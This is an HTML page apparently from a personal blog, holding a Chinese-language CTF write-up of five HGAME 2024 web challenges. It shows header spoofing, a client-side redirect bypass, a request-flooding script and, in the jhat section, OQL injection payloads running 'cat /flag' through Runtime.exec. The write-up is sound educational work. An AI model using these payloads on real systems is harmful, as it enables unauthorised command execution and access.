@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="ezHTTP1描述:HTTP Protocol Basics  123456789101112bp发包即可GET &#x2F; HTTP&#x2F;1.1Host: 106.15.72.34:31944Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Vidar; VidarOS x86_64) AppleWebKit&#x2F;537.36 (KHTML, like G">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HGAME 2024 WEEK 1 wp">
+<meta property="og:url" content="https://liangmosec.github.io/2024/02/06/HGAME-2024-WEEK-1-Web-wp/index.html">
+<meta property="og:site_name" content="Liangmo_sec">
+<meta property="og:description" content="ezHTTP1描述:HTTP Protocol Basics  123456789101112bp发包即可GET &#x2F; HTTP&#x2F;1.1Host: 106.15.72.34:31944Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Vidar; VidarOS x86_64) AppleWebKit&#x2F;537.36 (KHTML, like G">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206193735049.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206194112086.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206194516189.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206194751522.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206200206737.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240207020835872.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206200458064.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206200513541.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206200615454.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206201630697.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206212919536.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206213224930.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206191944385.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240207021105863.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206192734458.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206192953722.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240207021325809.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240207011034227-1707239592255-33.png">
+<meta property="article:published_time" content="2024-02-06T11:05:19.000Z">
+<meta property="article:modified_time" content="2024-02-17T22:24:48.044Z">
+<meta property="article:author" content="凉墨">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206193735049.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HGAME 2024 WEEK 1 wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/02/08/EvilBox-One/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/02/02/hello-world/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://liangmosec.github.io/2024/02/06/HGAME-2024-WEEK-1-Web-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://liangmosec.github.io/2024/02/06/HGAME-2024-WEEK-1-Web-wp/&text=HGAME 2024 WEEK 1 wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://liangmosec.github.io/2024/02/06/HGAME-2024-WEEK-1-Web-wp/&title=HGAME 2024 WEEK 1 wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://liangmosec.github.io/2024/02/06/HGAME-2024-WEEK-1-Web-wp/&is_video=false&description=HGAME 2024 WEEK 1 wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HGAME 2024 WEEK 1 wp&body=Check out this article: https://liangmosec.github.io/2024/02/06/HGAME-2024-WEEK-1-Web-wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://liangmosec.github.io/2024/02/06/HGAME-2024-WEEK-1-Web-wp/&title=HGAME 2024 WEEK 1 wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://liangmosec.github.io/2024/02/06/HGAME-2024-WEEK-1-Web-wp/&title=HGAME 2024 WEEK 1 wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://liangmosec.github.io/2024/02/06/HGAME-2024-WEEK-1-Web-wp/&title=HGAME 2024 WEEK 1 wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://liangmosec.github.io/2024/02/06/HGAME-2024-WEEK-1-Web-wp/&title=HGAME 2024 WEEK 1 wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://liangmosec.github.io/2024/02/06/HGAME-2024-WEEK-1-Web-wp/&name=HGAME 2024 WEEK 1 wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://liangmosec.github.io/2024/02/06/HGAME-2024-WEEK-1-Web-wp/&t=HGAME 2024 WEEK 1 wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ezHTTP"><span class="toc-number">1.</span> <span class="toc-text">ezHTTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-it"><span class="toc-number">2.</span> <span class="toc-text">Bypass it</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Select-Courses"><span class="toc-number">3.</span> <span class="toc-text">Select Courses</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2048-16"><span class="toc-number">4.</span> <span class="toc-text">2048*16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jhat"><span class="toc-number">5.</span> <span class="toc-text">jhat</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HGAME 2024 WEEK 1 wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">凉墨</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-02-06T11:05:19.000Z" class="dt-published" itemprop="datePublished">2024-02-06</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="ezHTTP"><a href="#ezHTTP" class="headerlink" title="ezHTTP"></a>ezHTTP</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">描述:HTTP Protocol Basics</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bp发包即可</span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 106.15.72.34:31944</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Vidar; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">x-real-ip: 127.0.0.1</span><br><span class="line">referer: vidar.club</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206193735049.png" alt="image-20240206193735049"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">页面返回 flag已经给我们了,,,  </span><br><span class="line">继续观察返回包  发现 认证部分有有趣的东西</span><br></pre></td></tr></table></figure>
+
+<p>很显然是一个JWT算法</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206194112086.png" alt="image-20240206194112086"></p>
+<h2 id="Bypass-it"><a href="#Bypass-it" class="headerlink" title="Bypass it"></a>Bypass it</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">描述:This page requires javascript to be enabled :)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206194516189.png" alt="image-20240206194516189"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">就只有登陆注册 功能 尝试一下弱口令 发现没登陆进去</span><br><span class="line">注册页面 还不允许注册</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206194751522.png" alt="image-20240206194751522"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过提示  使用了javascript   </span><br><span class="line">可以想着禁用JS或者拦截返回包或者通过登陆包来构造注册包</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>bp拦截响应包</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206200206737.png" alt="image-20240206200206737"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现由于JavaScript会跳转到login.html  尝试更换成register.html</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240207020835872.png" alt="image-20240207020835872"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">给我们跳转到了用户注册页面  随机注册个用户试试</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206200458064.png" alt="image-20240206200458064"></p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206200513541.png" alt="image-20240206200513541"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注册成功  登陆即可获得flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206200615454.png" alt="image-20240206200615454"></p>
+<blockquote>
+<p>其实可以根据登陆包直接构造出一个注册包 login改成register即可</p>
+</blockquote>
+<h2 id="Select-Courses"><a href="#Select-Courses" class="headerlink" title="Select Courses"></a>Select Courses</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">描述:Can you help ma5hr00m select the desired courses?</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206201630697.png" alt="image-20240206201630697"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原本一直都不知道考点是什么  但是随便点击  发现就选上了一个  </span><br><span class="line">然后就尝试写了一个简易脚本(根据数据包) 一直选择课程 直到选上之后结束</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://106.14.57.14:32702/api/courses&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;id&quot;</span>: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">        data[<span class="string">&quot;id&quot;</span>] = i</span><br><span class="line">        response = requests.post(url, json=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;&quot;full&quot;:0&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Response for id=<span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">运行脚本 是一个随机性的问题  等一会 出现完所有课程id 即 选课完了</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206212919536.png" alt="image-20240206212919536"></p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206213224930.png" alt="image-20240206213224930"></p>
+<blockquote>
+<p>比赛时候的脚本是简历脚本课程一个个跑 然后换课程<br>赛后看网上wp整了跑新全课程脚本</p>
+<p>亦可以bp 攻击模块选课</p>
+</blockquote>
+<h2 id="2048-16"><a href="#2048-16" class="headerlink" title="2048*16"></a>2048*16</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">描述：2048还是太简单了，柏喵喵决定挑战一下2048*16</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">前端2048游戏  需要我们玩到32768 (显然很难玩到，游戏大神除外)</span><br><span class="line">查看源代码 发现程序设置了禁止调试且做了JS混淆　　</span><br><span class="line">继续翻翻JS代码　看看能不能翻到什么有趣的东西吧</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206191944385.png" alt="image-20240206191944385"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">发现了明显特征 game-won  可以猜测密文/表有可能为</span><br><span class="line">V+g5LpoEej/fy0nPNivz9SswHIhGaDOmU8CuXb72dB1xYMrZFRAl=QcTq6JkWK4t3</span><br><span class="line">且根据代码 寻找x</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240207021105863.png" alt="image-20240207021105863"></p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206192734458.png" alt="image-20240206192734458"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">经尝试  此处含密文</span><br><span class="line">I7R8ITMCnzbCn5eFIC=6yliXfzN=I5NMnz0XIC==yzycysi70ci7y7iK</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206192953722.png" alt="image-20240206192953722"></p>
+<p>一个换表的base64(个人感受是挺无语的,我翻挺久的…..)</p>
+<h2 id="jhat"><a href="#jhat" class="headerlink" title="jhat"></a>jhat</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">描述:</span><br><span class="line">jhat is a tool used for analyzing Java heap dump files</span><br><span class="line">提示1  hint1: need rce</span><br><span class="line">提示2  hint2: focus on oql</span><br><span class="line">提示3  hint3: 题目不出网 想办法拿到执行结果</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">附件给了dockerfile.txt</span><br><span class="line">FROM openjdk:8</span><br><span class="line"># 指定新镜像的基础镜像</span><br><span class="line">COPY data /</span><br><span class="line"># 将宿主机的data目录中的文件复制到根目录</span><br><span class="line">CMD jhat heapdump.hprof</span><br><span class="line"># CMD 指定容器启动时默认执行的命令</span><br><span class="line"># jhat命令对 heapdump.hprof文件进行分析</span><br><span class="line"># jhat 是Java堆分析工具,用于分析Java堆转储文件</span><br><span class="line">EXPOSE 7000</span><br><span class="line"># 告知docker容器暴露出来的端口   docker的监听端口</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jhat  有关java安全 只能说自己学的还是少了 只能根据遇到的题目 继续去学习</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>jhat是jdk内置的工具之一。主要是用来分析java堆的命令，可以将堆中的对象以html的形式显示出来，包括对象的数量，大小等等，并支持对象查询语言</p>
+</blockquote>
+<blockquote>
+<p> OQL是一种类似于SQL的查询语言，主要用于在Java虚拟机（JVM）的堆内存中进行对象的查找和筛选。</p>
+</blockquote>
+<p>参考:<a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/OQL(%E5%AF%B9%E8%B1%A1%E6%9F%A5%E8%AF%A2%E8%AF%AD%E8%A8%80">OQL(对象查询语言)在产品实现中造成的RCE(Object Injection) - Nebula (wooyun.js.org)</a>在产品实现中造成的RCE(Object Injection).html)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(&quot;cat flag&quot;).getInputStream(),&quot;gbk&quot;)).readLine()</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>第一个获取的RCE不完全  下面官方RCE相对于第一个 获取的shell更完整</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new java.util.Scanner(java.lang.Runtime.getRuntime().exec(&#x27;cat /flag&#x27;).getInputStream())</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240207021325809.png" alt="image-20240207021325809"></p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240207011034227-1707239592255-33.png" alt="image-20240207011034227"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Categories</a></li>
+        
+          <li><a href="/links/">Links</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ezHTTP"><span class="toc-number">1.</span> <span class="toc-text">ezHTTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-it"><span class="toc-number">2.</span> <span class="toc-text">Bypass it</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Select-Courses"><span class="toc-number">3.</span> <span class="toc-text">Select Courses</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2048-16"><span class="toc-number">4.</span> <span class="toc-text">2048*16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jhat"><span class="toc-number">5.</span> <span class="toc-text">jhat</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://liangmosec.github.io/2024/02/06/HGAME-2024-WEEK-1-Web-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://liangmosec.github.io/2024/02/06/HGAME-2024-WEEK-1-Web-wp/&text=HGAME 2024 WEEK 1 wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://liangmosec.github.io/2024/02/06/HGAME-2024-WEEK-1-Web-wp/&title=HGAME 2024 WEEK 1 wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://liangmosec.github.io/2024/02/06/HGAME-2024-WEEK-1-Web-wp/&is_video=false&description=HGAME 2024 WEEK 1 wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HGAME 2024 WEEK 1 wp&body=Check out this article: https://liangmosec.github.io/2024/02/06/HGAME-2024-WEEK-1-Web-wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://liangmosec.github.io/2024/02/06/HGAME-2024-WEEK-1-Web-wp/&title=HGAME 2024 WEEK 1 wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://liangmosec.github.io/2024/02/06/HGAME-2024-WEEK-1-Web-wp/&title=HGAME 2024 WEEK 1 wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://liangmosec.github.io/2024/02/06/HGAME-2024-WEEK-1-Web-wp/&title=HGAME 2024 WEEK 1 wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://liangmosec.github.io/2024/02/06/HGAME-2024-WEEK-1-Web-wp/&title=HGAME 2024 WEEK 1 wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://liangmosec.github.io/2024/02/06/HGAME-2024-WEEK-1-Web-wp/&name=HGAME 2024 WEEK 1 wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://liangmosec.github.io/2024/02/06/HGAME-2024-WEEK-1-Web-wp/&t=HGAME 2024 WEEK 1 wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    凉墨
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+ 
+  <link
+    rel="preload"
+    href="/lib/font-awesome/css/all.min.css"
+    as="style"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+  <noscript
+    ><link
+      rel="stylesheet"
+      href="/lib/font-awesome/css/all.min.css"
+  /></noscript>
+
+
+    <!-- jquery -->
+
+  
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+
+
+
+<!-- clipboard -->
+
+  
+    
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
